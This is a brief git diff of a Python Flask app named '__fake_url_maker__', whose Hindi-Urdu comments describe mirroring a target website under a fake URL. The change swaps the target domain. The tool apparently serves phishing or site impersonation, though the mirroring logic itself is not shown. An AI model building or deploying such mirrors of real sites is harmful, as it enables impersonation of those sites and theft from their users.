@@ -4,7 +4,7 @@ import requests
 app = Flask(__fake_url_maker__)
 
 # Target website jo mirror karni hai jiski fake url apko banani he yaha per dalo niche
-ORIGINAL_SITE = "https://shahzaibx.online/"  # Change this to actual target- url change kr lena Original Website ka 
+ORIGINAL_SITE = "https://token2.raghavchoudhary.site/"  # Change this to actual target- url change kr lena Original Website ka 
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
